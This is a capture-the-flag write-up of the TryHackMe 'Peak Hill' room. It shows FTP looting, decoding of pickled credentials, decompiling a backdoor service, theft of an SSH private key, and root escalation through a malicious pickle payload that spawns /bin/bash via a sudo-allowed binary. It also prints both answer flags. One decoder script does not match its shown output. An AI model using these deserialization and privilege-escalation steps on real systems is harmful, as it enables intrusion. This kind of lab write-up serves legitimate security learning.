<h1 align="center">Peak Hill</h1>
<p align="center">July 29, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>449</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Exercises in Python library abuse and some exploitation techniques</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/3ccf6150-3203-414c-a2ed-d74aa7c0fe8b"><br>
Click <a href="https://tryhackme.com/room/peakhill">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/75ba3132-804d-47c1-9b88-4e3786aca116"></p>

<br>

<h2>Task 1 . Peak Hill</h2>
<p>Deploy and compromise the machine!<br>
Make sure you're connected to TryHackMe's network.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. What is the user flag?<br>
<code>f1e13335c47306e193212c98fc07b6a0</code></p>

<br>


<h3>Nmap</h3>

```bash
:~/PeakHill# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:AttackIP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
7321/tcp open   swx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     Username: Password:
|   NULL: 
|_    Username:
```

<br>

<h3>Port 7321</h3>

<img width="700px" src="https://github.com/user-attachments/assets/507c0a8d-454d-4d02-8087-718ce39a16ed"></p>

```bash
:~/PeakHill# nc TargetIP 7321
Username: admin
Password: admin
Wrong credentials!
```

<h3>FTP</h3>

```bash
:~/PeakHill# ftp TargetIP
Connected to TargetIP.
220 (vsFTPd 3.0.3)
Name (TargetIP:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
-rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
226 Directory send OK.
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (19.6236 kB/s)
ftp> get .creds
local: .creds remote: .creds
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .creds (7048 bytes).
226 Transfer complete.
7048 bytes received in 0.00 secs (4.6483 MB/s)
ftp> exit
221 Goodbye.
```

<h3>File Type</h3>

```bash
:~/PeakHill# file test.txt
test.txt: ASCII text
:~/PeakHill# file .creds
.creds: ASCII text, with very long lines, with no line terminators
```

<h3>test.txt</h3>

```bash
:~/PeakHill# cat test.txt
vsftpd test file
```

<h3>.creds</h3>

<img width="1284" height="483" alt="image" src="https://github.com/user-attachments/assets/d616bec5-b439-422c-a402-3b1fa2e87579" />

```bash
]q(X
ssh_pass15qXuqqX	ssh_user1qXhqqX
ssh_pass25qXrqq	X
ssh_pass20q
hqX	ssh_pass7qX_q
qX	ssh_user0qXgqqX
ssh_pass26qXlqqX	ssh_pass5qX3qqX	ssh_pass1qX1qqX
ssh_pass22qh
qX
ssh_pass12qX@qqX	ssh_user2q Xeq!q"X	ssh_user5q#Xiq$q%X
ssh_pass18q&h
q'X
ssh_pass27q(Xdq)q*X	ssh_pass3q+Xkq,q-X
ssh_pass19q.Xtq/q0X	ssh_pass6q1Xsq2q3X	ssh_pass9q4hq5X
ssh_pass23q6Xwq7q8X
ssh_pass21q9hq:X	ssh_pass4q;hq<X
ssh_pass14q=X0q>q?X	ssh_user6q@XnqAqBX	ssh_pass2qCXcqDqEX
ssh_pass13qFhqGX
ssh_pass16qHhAqIX	ssh_pass8qJhqKX
ssh_pass17qLh)qMX
ssh_pass24qNh>qOX	ssh_user3qPhqQX	ssh_user4qRh,qSX
ssh_pass11qTh
qUX	ssh_pass0qVXpqWqXX
ssh_pass10qYhqZe.
```


<p>

- also practiced to decode it using a Python script named <code>DecodePickle.py</code><br>
- used <code>.creds</code> as an input<br>
- saved the output in <code>CredsDecoded.txt</code> file<br>
</p>

<p><em>DecodePickle.py</em></p>

```bash
#!/usr/bin/env python3

with open('CredsDecoded.txt', 'w') as credsout, open('.creds', 'r') as credsin:
    r = credsin.read()
    # chunks of 8
    b = ' '.join([r[i:i+8] for i in range(0, len(r), 8)])
    # decode
    credsout.write(''.join([chr(int(c, 2)) for c in b.split(' ')]))
```

<p><em>CredsDecoded.txt</em></p>

```bash
]q(X
ssh_pass15qXuqqX	ssh_user1qXhqqX
ssh_pass25qXrq	X
ssh_pass20q
hq
  X	ssh_pass7q
qX      ssh_user0qXgqqX
ssh_pass26qXlqqX	ssh_pass5qX3qqX	ssh_pass1qX1qq\ufffdX
qXh_pass22q
ssh_pass12qX@qqX	ssh_user2q Xeq!q"X	ssh_user5q#Xiq$q%X
q'X_pass18q&h
ssh_pass27q(Xdq)q*X	ssh_pass3q+Xkq,q-X
ssh_pass19q.Xtq/q0X	ssh_pass6q1Xsq2q3X	ssh_pass9q4hq5X
ssh_pass23q6Xwq7q8X
ssh_pass21q9hq:X	ssh_pass4q;hq<X
ssh_pass14q=X0q>q?X	ssh_user6q@XnqAqBX	ssh_pass2qCXcqDqEX
ssh_pass13qFqGX
ssh_pass16qHhAqIX	ssh_pass8qJhqKX
ssh_pass17qLh)qMX
ssh_pass24qNh>qOX	ssh_user3qPqQX	ssh_user4qRh,qSX
qUX_passssh_pass0qVXpqWqXX
```

<img width="803" height="470" alt="image" src="https://github.com/user-attachments/assets/8d137937-20b7-49d5-809a-176150ec2908" />

<p>
  
- renamed <code>CredsDecoded.txt</code> to <code>creds.dat</code></p>

<br>

<p><em>DecodeDecodePickle.py</em></p>

```bash
#!/usr/bin/env python3

import pickle
import re

with open('creds.dat', 'rb') as f:
    data = pickle.load(f)
    sshuser = []
    sshpass = []

    for i in data:
        pos = int(re.findall('\d+', i[0])[0])
        if 'ssh_user' in i[0]:
            sshuser.append([pos, i[1]])
        else:
            sshpass.append([pos, i[1]])

    sshuser.sort()
    sshpass.sort()
    print("SSH user: {}".format(''.join([i[1] for i in sshuser])))
```

```bash
:~/PeakHill# python DecodeDecodePickle.py
SSH user: gherkin
SSH pass: p1ckl3s_@11_@r0und_th3_w0rld
```


```bash
:~/PeakHill# ssh gherkin@TargetIP
...
gherkin@ubuntu-xenial:~$ ls -lah
total 16K
drwxr-xr-x 3 gherkin gherkin 4.0K Jul 29 21:02 .
drwxr-xr-x 4 root    root    4.0K May 15  2020 ..
drwx------ 2 gherkin gherkin 4.0K Jul 29 21:02 .cache
-rw-r--r-- 1 root    root    2.3K May 15  2020 cmd_service.pyc
```

<h3>Downloaded <code>cmd_service.pyc</code></h3>

```bash
:~/PeakHill# scp gherkin@TargetIP:/home/gherkin/cmd_service.pyc .
gherkin@10.10.12.119's password: 
cmd_service.pyc                   
```

<h3>Installed <code>uncompyle6</code></h3>

```bash
:~/PeakHill# pip3 install uncompyle6
...
:~/PeakHill# uncompyle6 --version
uncompyle6, version 3.9.2
```

<h3>Retrieved Python Code using <code>uncompyle6</code></h3>

```bash
:~/PeakHill# uncompyle6 cmd_service.pyc
# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 18:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print("Starting server...")
    port = 7321
    host = "0.0.0.0"
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print("Server started on " + str(server.server_address) + "!")
    while True:
        sleep(10)


if __name__ == "__main__":
    main()

# okay decompiling cmd_service.pyc
```

<h3>Uncovered Credentials</h3>

```bash
:~/PeakHill# python
...
[GCC 9.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> print(long_to_bytes(1684630636))
dill
>>> print(long_to_bytes(2457564920124666544827225107428488864802762356))
n3v3r_@_d1ll_m0m3nt
>>>
```

<img width="1212" height="187" alt="image" src="https://github.com/user-attachments/assets/8c019a30-3f1f-4b21-a01e-b50336f9ace4" />

<br>

<h3>Port 7321</h3>


```bash
:~/PeakHill# nc TargetIP 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!
Cmd: 
```

<img width="1216" height="155" alt="image" src="https://github.com/user-attachments/assets/a68665a6-5ad9-4909-a16b-2f9bba70eba3" />



```bash
Cmd: id
uid=1003(dill) gid=1003(dill) groups=1003(dill)

Cmd: pwd
/var/cmd

Cmd: ls -lah /home/dill
total 32K
drwxr-xr-x 5 dill dill 4.0K May 20  2020 .
drwxr-xr-x 4 root root 4.0K May 15  2020 ..
-rw------- 1 root root  889 May 20  2020 .bash_history
-rw-r--r-- 1 dill dill 3.8K May 18  2020 .bashrc
drwx------ 2 dill dill 4.0K May 15  2020 .cache
drwxrwxr-x 2 dill dill 4.0K May 20  2020 .nano
drwxr-xr-x 2 dill dill 4.0K May 15  2020 .ssh
-r--r----- 1 dill dill   33 May 15  2020 user.txt

Cmd: cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0

Cmd: 
```

<br>

<p>1.2. What is the root flag?<br>
<code>e88f0a01135c05cf0912cf4bc335ee28</code></p>

<br>


```bash
Cmd: ls -lah /home/dill/.ssh
total 20K
drwxr-xr-x 2 dill dill 4.0K May 15  2020 .
drwxr-xr-x 5 dill dill 4.0K May 20  2020 ..
-rw-r--r-- 1 dill dill  568 May 15  2020 authorized_keys
-rw------- 1 dill dill 2.6K May 15  2020 id_rsa
-rw-r--r-- 1 dill dill  568 May 15  2020 id_rsa.pub
```

```bash
cmd: cat /home/dill/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
1jQDq0uR5dwM2nz14JqSyrDFycHIUCVLVJp5IUm7XBptuCN8I+VHpYh0mrQOzhKLu3Xy9I
/V7pwBay5mHnsAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----
```


```bash
:~/PeakHill# nano dill_id_rsa
:~/PeakHill# chmod 400 dill_id_rsa
```

<img width="1293" height="319" alt="image" src="https://github.com/user-attachments/assets/be12d6ec-ca82-4329-8650-ca89779991d7" />

<br>

```bash
dill@ubuntu-xenial:~$ ls
user.txt
dill@ubuntu-xenial:~$ cat user.txt
f1e13335c47306e193212c98fc07b6a0
```

```bash
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

```bash
dill@ubuntu-xenial:~$ ls -la /opt/peak_hill_farm/peak_hill_farm
-rwxr-x--x 1 root root 1218056 May 15  2020 /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$ 
```

```bash
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

```bash
dill@ubuntu-xenial:~$ ls -la /opt/peak_hill_farm/peak_hill_farm
-rwxr-x--x 1 root root 1218056 May 15  2020 /opt/peak_hill_farm/peak_hill_farm
```

```bash
dill@ubuntu-xenial:~$ file /opt/peak_hill_farm/peak_hill_farm
/opt/peak_hill_farm/peak_hill_farm: executable, regular file, no read permission
```

```bash
dill@ubuntu-xenial:~$ ls -lah /opt/peak_hill_farm
total 12M
drwxr-xr-x 2 root root 4.0K May 15  2020 .
drwxr-xr-x 3 root root 4.0K May 20  2020 ..
-rwxr-x--- 1 root root 770K May 15  2020 base_library.zip
-rwxr-x--- 1 root root  22K Apr 17  2020 _bz2.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 147K Apr 17  2020 _codecs_cn.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 155K Apr 17  2020 _codecs_hk.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  31K Apr 17  2020 _codecs_iso2022.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 263K Apr 17  2020 _codecs_jp.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 135K Apr 17  2020 _codecs_kr.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 111K Apr 17  2020 _codecs_tw.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 153K Apr 17  2020 _ctypes.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  29K Apr 17  2020 _hashlib.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  66K Jul  4  2019 libbz2.so.1.0
-rwxr-x--- 1 root root 2.3M Feb 27  2019 libcrypto.so.1.0.0
-rwxr-x--- 1 root root 163K Sep 12  2019 libexpat.so.1
-rwxr-x--- 1 root root 135K Feb 12  2014 liblzma.so.5
-rwxr-x--- 1 root root 4.4M Apr 17  2020 libpython3.5m.so.1.0
-rwxr-x--- 1 root root 276K Feb  4  2016 libreadline.so.6
-rwxr-x--- 1 root root 419K Feb 27  2019 libssl.so.1.0.0
-rwxr-x--- 1 root root 164K Feb 19  2016 libtinfo.so.5
-rwxr-x--- 1 root root 103K Jan 21  2020 libz.so.1
-rwxr-x--- 1 root root  37K Apr 17  2020 _lzma.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  44K Apr 17  2020 _multibytecodec.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 6.4K Apr 17  2020 _opcode.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--x 1 root root 1.2M May 15  2020 peak_hill_farm
-rwxr-x--- 1 root root  31K Apr 17  2020 readline.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  16K Apr 17  2020 resource.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root 116K Apr 17  2020 _ssl.cpython-35m-x86_64-linux-gnu.so
-rwxr-x--- 1 root root  25K Apr 17  2020 termios.cpython-35m-x86_64-linux-gnu.so
```

```bash
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: hey
failed to decode base64
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: pickles
failed to decode base64
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: tomatoes
this not grow did not grow on the Peak Hill Farm! :(
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: lettuce
failed to decode base64
dill@ubuntu-xenial:/opt/peak_hill_farm$ 
```

<br>
<br>

```bash
dill@ubuntu-xenial:/opt/peak_hill_farm$ echo -n 'pickles' | base64
cGlja2xlcw==
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: cGlja2xlcw==
this not grow did not grow on the Peak Hill Farm! :(
```

<img width="1295" height="304" alt="image" src="https://github.com/user-attachments/assets/47c2cf38-18fd-4a9a-adb4-c15e13d1e99f" />

<br>
<br>

```bash
dill@ubuntu-xenial:/opt/peak_hill_farm$ python3
...
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> import pickle
>>> import base64
>>> class evil_object(object):
...     def __reduce__(self):
...         return (os.system, ('/bin/bash',))
... 
>>> x = evil_object()
>>> aux = pickle.dumps(x)             
>>> base64.b64encode(aux)
b'gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4='
>>> 
```

<br>
<br>

```bash
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=
```


```bash
root@ubuntu-xenial:/opt/peak_hill_farm# ls -lah /root
total 28K
drwx------  4 root root 4.0K May 18  2020 .
drwxr-xr-x 25 root root 4.0K Jul 29 20:03 ..
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4.0K May 18  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--r-----  1 root root   33 May 15  2020 \u2000root.txt\u2000
drwx------  2 root root 4.0K May 15  2020 .ssh
```


```bash
root@ubuntu-xenial:/opt/peak_hill_farm# cat /root/root.txt
cat: /root/root.txt: No such file or directory
```

<br>
<br>

<img width="1252" height="122" alt="image" src="https://github.com/user-attachments/assets/fc4381b0-9de1-476c-8b58-d8b4b6e3b901" />


```bash
root@ubuntu-xenial:/# find /root/ -name '*root.txt*'
/root/\u2000root.txt\u2000
```

```bash
root@ubuntu-xenial:/# find /root/ -name '*root.txt*' -exec cat {} \;
e88f0a01135c05cf0912cf4bc335ee28
```


<br>
<br>


<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/33d06252-f90f-4509-adf1-7beec11b828c"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9ea053bd-d91d-411c-b5b7-369b1adec630"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 29, 2025     | 449      |     144ᵗʰ    |      5ᵗʰ     |     129ᵗʰ   |     7ᵗʰ    | 117,866  |    881    |    72     |

</div>


<p align="center">Global All Time:   144ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/7c3c567a-c104-4371-abe1-d5fa6140d2b"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/16d307e4-19c7-4470-a6e6-e2b0b525ffd1"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c6add5bd-62e7-4446-9933-0c655ccf381c"><br>
                  Global monthly:    129ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3a473850-277e-4c0c-9d66-1e92e50d2470"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/1ad85dad-f0aa-4f8f-93dd-efb63270c1cd"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
